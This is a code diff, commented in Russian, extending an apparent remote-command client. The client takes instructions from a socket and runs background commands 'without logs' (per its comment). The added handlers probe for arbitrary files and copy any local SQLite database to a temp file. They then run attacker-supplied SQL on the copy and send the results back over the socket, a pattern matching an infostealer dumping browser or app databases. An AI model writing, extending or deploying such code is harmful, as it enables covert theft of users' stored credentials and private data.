@@ -88,6 +88,48 @@ def main():
                 if command.startswith("cmd:"):
                     cmd = command[4:].strip()
 
+                    # Новая обработка test_file_exists
+                    if cmd.startswith("test_file_exists:"):
+                        path = cmd[len("test_file_exists:"):].strip()
+                        path = os.path.expanduser(path)
+                        if os.path.exists(path):
+                            s.send("EXISTS".encode())
+                        else:
+                            s.send("NOT_FOUND".encode())
+                        continue
+
+                    # Новая обработка sqlite3_query
+                    if cmd.startswith("sqlite3_query:"):
+                        try:
+                            import tempfile
+                            import shutil
+                            import sqlite3
+
+                            payload = cmd[len("sqlite3_query:"):].strip()
+                            file_path, sql = payload.split(" ", 1)
+                            file_path = os.path.expanduser(file_path)
+
+                            tmp_file = tempfile.NamedTemporaryFile(delete=False)
+                            tmp_file.close()
+                            shutil.copy2(file_path, tmp_file.name)
+
+                            conn = sqlite3.connect(tmp_file.name)
+                            cursor = conn.cursor()
+                            cursor.execute(sql)
+                            rows = cursor.fetchall()
+                            cursor.close()
+                            conn.close()
+                            os.unlink(tmp_file.name)
+
+                            if not rows:
+                                s.send("NO_RESULTS".encode())
+                            else:
+                                lines = [" | ".join(str(col) for col in row) for row in rows]
+                                s.send("\n".join(lines).encode())
+                        except Exception as e:
+                            s.send(f"ERROR: {e}".encode())
+                        continue
+
                     # Запуск фоновых/nohup команд без логов, через setsid
                     if "nohup" in cmd or cmd.endswith('&'):
                         try:
